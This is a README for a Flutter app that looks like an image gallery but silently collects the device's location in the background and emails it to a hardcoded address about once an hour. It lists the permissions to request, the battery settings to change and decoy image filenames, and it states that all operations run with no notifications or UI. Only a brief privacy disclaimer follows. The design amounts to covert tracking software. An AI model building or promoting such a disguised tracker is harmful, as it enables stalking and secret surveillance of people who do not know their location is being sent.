# Hourly Location Tracker

A Flutter mobile application that tracks user location in the background and sends updates via email approximately every hour.

## ⚠️ IMPORTANT PLATFORM LIMITATIONS – JANUARY 2026

### Android:
- **Requires user to manually disable battery optimization** for the app in system settings
- Real interval usually **15min–2h+**, very rarely exactly 60min
- Needs **FOREGROUND SERVICE** for better reliability (with persistent notification)
- Background location tracking may be restricted by Android's battery optimization features

### iOS:
- **Almost impossible** to achieve reliable 1-hour location updates in background
- `background_fetch` typically gives **30min–several hours** interval
- Most probably will **NOT work** after app is force-closed or after few days
- Apple **rejects most apps** that try to do continuous location tracking without visible UI purpose
- iOS background location is heavily restricted and unreliable for periodic updates

## Installation

1. Clone or download this project
2. Run `flutter pub get` to install dependencies
3. Add your images to `assets/images/` directory (see example names below)
4. Configure email service (see Email Configuration section)

## Platform-Specific Setup

### Android Setup

1. **AndroidManifest.xml** - Already configured with required permissions:
   - `ACCESS_FINE_LOCATION`
   - `ACCESS_COARSE_LOCATION`
   - `ACCESS_BACKGROUND_LOCATION` (Android 10+)
   - `FOREGROUND_SERVICE`
   - `FOREGROUND_SERVICE_LOCATION`
   - `WAKE_LOCK`
   - `INTERNET`

2. **Battery Optimization** (CRITICAL):
   - User must go to: Settings → Apps → Hourly Location Tracker → Battery → Unrestricted
   - Or: Settings → Battery → Battery Optimization → Find app → Don't optimize

3. **Location Permissions**:
   - App will request location permissions on first launch
   - User must select "Allow all the time" (not just "While using app")

### iOS Setup

1. **Info.plist** - Already configured with:
   - `NSLocationAlwaysAndWhenInUseUsageDescription`
   - `NSLocationWhenInUseUsageDescription`
   - `UIBackgroundModes` with `fetch` and `location`

2. **Location Permissions**:
   - User must grant "Always" location permission (not just "While Using App")
   - Go to: Settings → Privacy → Location Services → Hourly Location Tracker → Always

3. **Background App Refresh**:
   - User must enable: Settings → General → Background App Refresh → ON
   - And specifically enable it for this app

## Email Configuration

The app uses an HTTP-based email service. You need to configure one of the following:

### Option 1: EmailJS (Recommended for testing)
1. Sign up at https://www.emailjs.com/
2. Create a service and template
3. Update `lib/services/email_service.dart` with your EmailJS credentials

### Option 2: Custom SMTP API
1. Set up your own email API endpoint
2. Update `lib/services/email_service.dart` with your API endpoint

### Changing Target Email Address

Edit `lib/services/email_service.dart` and change the `_targetEmail` constant:

```dart
static const String _targetEmail = 'tracking@example.com';
```

## Example Asset Images

Place 12-20 images in `assets/images/` directory. Suggested names:

- `nature_1.jpg`
- `nature_2.jpg`
- `city_1.jpg`
- `city_2.jpg`
- `abstract_1.jpg`
- `abstract_2.jpg`
- `landscape_1.jpg`
- `landscape_2.jpg`
- `architecture_1.jpg`
- `architecture_2.jpg`
- `sunset_1.jpg`
- `sunset_2.jpg`
- `mountain_1.jpg`
- `mountain_2.jpg`
- `ocean_1.jpg`
- `ocean_2.jpg`
- `forest_1.jpg`
- `forest_2.jpg`

## Running the App

```bash
flutter run
```

## How It Works

1. App launches showing only a gallery of images
2. Background service initializes automatically
3. Every ~60 minutes (when possible):
   - Checks if internet is available
   - Gets current location
   - Sends email with location data
   - Saves timestamp of last successful send
4. All operations are silent (no notifications, no UI updates)

## Troubleshooting

- **Location not updating**: Check battery optimization settings and location permissions
- **Emails not sending**: Verify internet connection and email service configuration
- **iOS not working**: This is expected - iOS background location is extremely unreliable
- **Android interval too long**: Disable battery optimization and ensure foreground service is running

## Privacy & Legal

This app tracks location in the background. Ensure you comply with all local privacy laws and regulations. Users should be aware that their location is being tracked and transmitted.

